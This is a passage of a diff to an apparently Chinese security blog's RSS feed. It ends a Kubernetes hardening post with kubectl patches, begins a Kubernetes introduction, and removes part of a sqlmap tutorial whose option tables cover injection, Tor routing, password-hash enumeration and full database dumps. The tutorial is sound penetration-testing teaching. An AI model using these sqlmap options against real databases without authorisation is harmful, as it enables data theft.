+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 禁用不安全端口 --insecure-port=0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 禁止外部访问，删除 --insecure-bind-address=0.0.0.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 确保有以下安全配置：&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 禁用匿名访问 --anonymous-auth=false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 启用RBAC授权 --authorization-mode=Node,RBAC &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 启用节点限制 --enable-admission-plugins=NodeRestriction&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 修复dashboard&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 移除--enable-insecure-login&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl -n kube-system patch deployment kubernetes-dashboard --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;remove&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/template/spec/containers/0/args/2&amp;#34;}]&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 移除--enable-skip-login&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl -n kube-system patch deployment kubernetes-dashboard --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;remove&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/template/spec/containers/0/args/2&amp;#34;}]&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo systemctl restart kubelet
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://developer.aliyun.com/article/1626337" target="_blank" rel="noopener"
+>https://developer.aliyun.com/article/1626337&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.jianshu.com/p/e443b3171253" target="_blank" rel="noopener"
+>https://www.jianshu.com/p/e443b3171253&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.freebuf.com/articles/container/382450.html" target="_blank" rel="noopener"
+>https://www.freebuf.com/articles/container/382450.html&lt;/a>&lt;/p>&lt;/blockquote></description></item><item><title>Kubernetes基础入门使用</title><link>https://baozongwi.xyz/p/kubernetes-getting-started-tutorial/</link><pubDate>Mon, 29 Sep 2025 09:04:12 +0800</pubDate><guid>https://baozongwi.xyz/p/kubernetes-getting-started-tutorial/</guid><description>&lt;h2 id="概念">概念
 &lt;/h2>&lt;p>现在国内的安全越来越少的传统AD了，所以k8s是不可能越过的坎，必须来了解学习一下。包括现在很多的CTF平台其实都更倾向于使用轻量k8s(k3s)。&lt;/p>
 &lt;p>Kubernetes是一个可以移植、可扩展的开源平台，使用声明式配置并依据配置信息自动地执行容器化应用程序的管理。在所有的容器编排工具中（类似的还有 docker swarm / mesos等），Kubernetes的生态系统更大、增长更快，有更多的支持、服务和工具可供用户选择。&lt;/p>
 &lt;p>其中，声明式配置就是使用yaml等文件明确定义应用等期望状态，这样的好处是什么呢？&lt;/p>
@@ -4239,2294 +4539,4 @@ class="gallery-image"
 data-flex-grow="336"
 data-flex-basis="807px"
 >&lt;/p>
-&lt;p>thinkphp cakephp等框架去慢慢动调挖掘，也是very good，这里只介绍pop的，因为弟弟我实在是太菜😭，后面会其他了，再单独写&lt;/p></description></item><item><title>sqlmap使用</title><link>https://baozongwi.xyz/p/sqlmap-usage/</link><pubDate>Mon, 05 May 2025 09:33:13 +0000</pubDate><guid>https://baozongwi.xyz/p/sqlmap-usage/</guid><description>&lt;h2 id="安装">安装
-&lt;/h2>&lt;p>工具这类的东西肯定是越新越好，所以建议是&lt;code>git&lt;/code>安装&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cd sqlmap-dev
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py --help
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>其实这个工具的CTF里面基本都用不了，不过实际渗透中相当实用，特别是UDF提权，都要使用到其中的so文件&lt;/p>
-&lt;h2 id="使用选项">使用选项
-&lt;/h2>&lt;p>从大菜鸡师傅那里抄过来命令&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">用法: python sqlmap.py [选项]
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="基础选项">基础选项:
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-h&lt;/code>, &lt;code>--help&lt;/code>&lt;/td>
-&lt;td>显示基础的帮助信息，然后退出&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-hh&lt;/code>&lt;/td>
-&lt;td>显示高级的帮助信息，然后退出&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--version&lt;/code>&lt;/td>
-&lt;td>显示脚本的版本，然后退出&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-v VERBOSE&lt;/code>&lt;/td>
-&lt;td>显示测试细节 默认数字1-6&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="目标">目标:
-&lt;/h3>&lt;p>&lt;em>至少选择下列一种模式&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-d&lt;/code>&lt;/td>
-&lt;td>转发模式 给定连接字符串，连接目标数据库&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-u&lt;/code>, &lt;code>--url=&lt;/code>&lt;/td>
-&lt;td>直连模式，直接连接目标地址，例如：http://www.site.com/vuln.php?id=1&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-l&lt;/code>&lt;/td>
-&lt;td>日志模式 从Burp或者WebScarab载入代理日志文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-m&lt;/code>&lt;/td>
-&lt;td>批量模式 从给定的文本文件扫描多个目标地址&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-r&lt;/code>&lt;/td>
-&lt;td>请求模式 从文件中载入http请求&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-g&lt;/code>&lt;/td>
-&lt;td>谷歌傻瓜模式 从谷歌搜索地址做为目标地址&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-c&lt;/code>&lt;/td>
-&lt;td>配置模式 从ini配置文件载入目标地址&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="请求">请求:
-&lt;/h3>&lt;p>&lt;em>下面的选项是用来详细说明如何连接目标地址&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--method=方法&lt;/code>&lt;/td>
-&lt;td>强制使用指定的方式进行连接，例如 PUT&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--data=数据&lt;/code>&lt;/td>
-&lt;td>通过POST发送数据字符串，例如: &lt;code>--data=&amp;quot;id=1&amp;quot;&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--param-del=参数分割&lt;/code>&lt;/td>
-&lt;td>参数分割字符，例如：&amp;amp;&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--cookie=COOKIE&lt;/code>&lt;/td>
-&lt;td>HTTP Cookie 头的值 例如: &lt;code>PHPSESSID=a8d127e..&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--cookie-del=COO..&lt;/code>&lt;/td>
-&lt;td>cookie分割字符，例如：;&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--load-cookies=L..&lt;/code>&lt;/td>
-&lt;td>从文件载入cookie值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--drop-set-cookie&lt;/code>&lt;/td>
-&lt;td>忽略响应数据中的 Set-Cookie，即使用响应cookie&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--user-agent=AGENT&lt;/code>&lt;/td>
-&lt;td>设置HTTP User-Agent 的值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--random-agent&lt;/code>&lt;/td>
-&lt;td>使用随机 User-Agent 的值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--host=HOST&lt;/code>&lt;/td>
-&lt;td>设置 HTTP Host 的值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--referer=REFERER&lt;/code>&lt;/td>
-&lt;td>设置 HTTP Referer 的值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-H HEADER&lt;/code>, &lt;code>--hea..&lt;/code>&lt;/td>
-&lt;td>设置拓展头 例如：&lt;code>X-Forwarded-For: 127.0.0.1&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--headers=HEADERS&lt;/code>&lt;/td>
-&lt;td>设置多个HTTP头 例如：&lt;code>Accept-Language: fr\nETag: 123&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--auth-type=AUTH..&lt;/code>&lt;/td>
-&lt;td>设置HTTP认证类型 (Basic, Digest, NTLM 或 PKI)&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--auth-cred=AUTH..&lt;/code>&lt;/td>
-&lt;td>设置HTTP认证账密 例如：&lt;code>name:password&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--auth-file=AUTH..&lt;/code>&lt;/td>
-&lt;td>设置PEM私钥证书文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--ignore-code=IG..&lt;/code>&lt;/td>
-&lt;td>忽略HTTP错误码 例如：401&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--ignore-proxy&lt;/code>&lt;/td>
-&lt;td>忽略系统的代理设置&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--ignore-redirects&lt;/code>&lt;/td>
-&lt;td>忽略重定向尝试&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--ignore-timeouts&lt;/code>&lt;/td>
-&lt;td>忽略连接超时&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--proxy=PROXY&lt;/code>&lt;/td>
-&lt;td>使用代理连接目标地址&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--proxy-cred=PRO..&lt;/code>&lt;/td>
-&lt;td>使用代理进行HTTP认证 例如：&lt;code>name:password&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--proxy-file=PRO..&lt;/code>&lt;/td>
-&lt;td>从文件中载入代理列表&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--tor&lt;/code>&lt;/td>
-&lt;td>使用洋葱匿名网络&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--tor-port=TORPORT&lt;/code>&lt;/td>
-&lt;td>设置洋葱匿名代理的非默认端口&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--tor-type=TORTYPE&lt;/code>&lt;/td>
-&lt;td>设置洋葱匿名代理的类型 例如：HTTP, SOCKS4 或 SOCKS5 (默认))&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--check-tor&lt;/code>&lt;/td>
-&lt;td>检查洋葱匿名代理网络是否可用&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--delay=DELAY&lt;/code>&lt;/td>
-&lt;td>设置两次请求之间的延时，单位：秒&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--timeout=TIMEOUT&lt;/code>&lt;/td>
-&lt;td>设置连接目标地址超时时间 (默认30秒)&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--retries=RETRIES&lt;/code>&lt;/td>
-&lt;td>设置连接超时重试次数 (默认3次)&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--randomize=RPARAM&lt;/code>&lt;/td>
-&lt;td>对给定的请求参数值进行随机化&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--safe-url=SAFEURL&lt;/code>&lt;/td>
-&lt;td>设置在测试目标地址前访问的安全链接&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--safe-post=SAFE..&lt;/code>&lt;/td>
-&lt;td>设置安全链接POST发送的数据&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--safe-req=SAFER..&lt;/code>&lt;/td>
-&lt;td>从文件中载入安全链接列表&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--safe-freq=SAFE..&lt;/code>&lt;/td>
-&lt;td>设置两次注入测试前访问安全链接的次数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--skip-urlencode&lt;/code>&lt;/td>
-&lt;td>跳过对攻击载荷的URL编码&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--csrf-token=CSR..&lt;/code>&lt;/td>
-&lt;td>保存反CSRF令牌&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--csrf-url=CSRFURL&lt;/code>&lt;/td>
-&lt;td>提取CSRF令牌的地址&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--force-ssl&lt;/code>&lt;/td>
-&lt;td>强制使用 SSL/HTTPS&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--hpp&lt;/code>&lt;/td>
-&lt;td>使用HTTP参数污染&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--eval=EVALCODE&lt;/code>&lt;/td>
-&lt;td>请求前使用自定义python脚本 例如：&lt;br>&lt;code>import hashlib;&lt;/code>&lt;br/>&lt;code>id2=hashlib.md5(id).hexdigest()&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="优化选项">优化选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项是用来优化sqlmap的性能&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-o&lt;/code>&lt;/td>
-&lt;td>打开所有优化选项开关&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--predict-output&lt;/code>&lt;/td>
-&lt;td>预测常见查询输出&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--keep-alive&lt;/code>&lt;/td>
-&lt;td>使用 HTTP(s) 持久化连接&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--null-connection&lt;/code>&lt;/td>
-&lt;td>只检测响应数据长度，不检测响应内容&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--threads=THREADS&lt;/code>&lt;/td>
-&lt;td>设置最大运行线程 (默认1线程)&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="注入选项">注入选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来指定注入测试的定制参数和篡改脚本&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-p TESTPARAMETER&lt;/code>&lt;/td>
-&lt;td>设置要注入的参数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--skip=SKIP&lt;/code>&lt;/td>
-&lt;td>设置要跳过注入的参数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--skip-static&lt;/code>&lt;/td>
-&lt;td>设置跳过静态参数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--param-exclude=..&lt;/code>&lt;/td>
-&lt;td>对要注入参数进行正则匹配 例如：ses&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dbms=DBMS&lt;/code>&lt;/td>
-&lt;td>指定注入地址的后台数据库名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dbms-cred=DBMS..&lt;/code>&lt;/td>
-&lt;td>指定数据库认证账密 例如：&lt;code>user:password&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--os=OS&lt;/code>&lt;/td>
-&lt;td>指定注入地址的操作系统&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--invalid-bignum&lt;/code>&lt;/td>
-&lt;td>对注入参数使用超大数字使其失效&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--invalid-logical&lt;/code>&lt;/td>
-&lt;td>对注入参数使用逻辑运算使其失效&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--invalid-string&lt;/code>&lt;/td>
-&lt;td>对注入参数使用随机字符串使其失效&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--no-cast&lt;/code>&lt;/td>
-&lt;td>关闭攻击载荷的生成器&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--no-escape&lt;/code>&lt;/td>
-&lt;td>关闭字符逃逸的生成器&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--prefix=PREFIX&lt;/code>&lt;/td>
-&lt;td>攻击载荷的前缀&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--suffix=SUFFIX&lt;/code>&lt;/td>
-&lt;td>攻击载荷的后缀&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--tamper=TAMPER&lt;/code>&lt;/td>
-&lt;td>指定攻击载荷的篡改脚本&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="检测选项">检测选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来定制检测&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--level=LEVEL&lt;/code>&lt;/td>
-&lt;td>指定注入测试级别 例如：1-5, 默认 1&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--risk=RISK&lt;/code>&lt;/td>
-&lt;td>指定注入测试风险等级，防止破坏数据 例如：1-3, 默认 1&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--string=STRING&lt;/code>&lt;/td>
-&lt;td>指定攻击载荷执行成功返回的字符串&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--not-string=NOT..&lt;/code>&lt;/td>
-&lt;td>指定攻击载荷执行失败返回的字符串&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--regexp=REGEXP&lt;/code>&lt;/td>
-&lt;td>指定攻击载荷执行成功匹配的正则表达式&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--code=CODE&lt;/code>&lt;/td>
-&lt;td>指定攻击载荷执行成功返回的HTTP状态码&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--text-only&lt;/code>&lt;/td>
-&lt;td>设置只检测返回文本来确定攻击载荷执行情况&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--titles&lt;/code>&lt;/td>
-&lt;td>设置检测返回页面标题确定攻击载荷执行情况&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="技术选项">技术选项:
-&lt;/h3>&lt;p>&lt;em>下面选项用来指定参数来调整指定的注入测试选项&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--technique=TECH&lt;/code>&lt;/td>
-&lt;td>开启定制 (default &amp;ldquo;BEUSTQ&amp;rdquo;)&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--time-sec=TIMESEC&lt;/code>&lt;/td>
-&lt;td>指定目标数据库响应时间 (默认5秒)&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--union-cols=UCOLS&lt;/code>&lt;/td>
-&lt;td>指定联合查询注入的列范围&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--union-char=UCHAR&lt;/code>&lt;/td>
-&lt;td>指定联合查询猜测列数量最大长度&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--union-from=UFROM&lt;/code>&lt;/td>
-&lt;td>指定联合查询使用的表&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dns-domain=DNS..&lt;/code>&lt;/td>
-&lt;td>指定DNS外带的解析地址&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--second-url=SEC..&lt;/code>&lt;/td>
-&lt;td>指定二次注入的结果页面&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--second-req=SEC..&lt;/code>&lt;/td>
-&lt;td>指定二次注入的结果页面列表文件&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="指纹选项">指纹选项:
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-f&lt;/code>, &lt;code>--fingerprint&lt;/code>&lt;/td>
-&lt;td>使用常见数据库指纹识别&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="枚举选项">枚举选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来枚举后端数据库管理系统的信息、结构以及表内的包含数据。此外，你可以运行自己的SQL语句&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-a&lt;/code>, &lt;code>--all&lt;/code>&lt;/td>
-&lt;td>检索所有内容&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-b&lt;/code>, &lt;code>--banner&lt;/code>&lt;/td>
-&lt;td>检索数据库欢迎信息&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--current-user&lt;/code>&lt;/td>
-&lt;td>检索数据库的当前用户&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--current-db&lt;/code>&lt;/td>
-&lt;td>检索当前使用的数据库名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--hostname&lt;/code>&lt;/td>
-&lt;td>检索数据库计算机名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--is-dba&lt;/code>&lt;/td>
-&lt;td>检测当前用户是否为数据库管理员&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--users&lt;/code>&lt;/td>
-&lt;td>枚举数据库的所有用户&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--passwords&lt;/code>&lt;/td>
-&lt;td>枚举数据库的所有用户密码哈希值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--privileges&lt;/code>&lt;/td>
-&lt;td>枚举数据库的所有用户权限&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--roles&lt;/code>&lt;/td>
-&lt;td>枚举数据库的所有用户角色&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dbs&lt;/code>&lt;/td>
-&lt;td>枚举数据库的所有数据库&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--tables&lt;/code>&lt;/td>
-&lt;td>枚举数据库的所有表&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--columns&lt;/code>&lt;/td>
-&lt;td>枚举数据库的所有列&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--schema&lt;/code>&lt;/td>
-&lt;td>枚举数据库汇总数据&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--count&lt;/code>&lt;/td>
-&lt;td>检索数据库的记录总数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dump&lt;/code>&lt;/td>
-&lt;td>转储数据库表的记录&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dump-all&lt;/code>&lt;/td>
-&lt;td>转储数据库的所有表记录，俗称脱裤&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--search&lt;/code>&lt;/td>
-&lt;td>搜索指定列、表、数据库&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--comments&lt;/code>&lt;/td>
-&lt;td>枚举时检测数据库的注释&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-D DB&lt;/code>&lt;/td>
-&lt;td>指定要枚举的数据库名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-T TBL&lt;/code>&lt;/td>
-&lt;td>指定要枚举的表名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-C COL&lt;/code>&lt;/td>
-&lt;td>指定要枚举的列名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-X EXCLUDE&lt;/code>&lt;/td>
-&lt;td>指定排除枚举的数据库名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-U USER&lt;/code>&lt;/td>
-&lt;td>指定枚举时的数据库用户&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--exclude-sysdbs&lt;/code>&lt;/td>
-&lt;td>设置枚举时包含数据库系统自带表&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--pivot-column=P..&lt;/code>&lt;/td>
-&lt;td>指定主键名称&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--where=DUMPWHERE&lt;/code>&lt;/td>
-&lt;td>转储数据表时，使用where条件语句&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--start=LIMITSTART&lt;/code>&lt;/td>
-&lt;td>转储表时，使用limit语句进行显示，设置limit的第一个参数&lt;/td>
-&lt;/tr>
-&lt;tr>
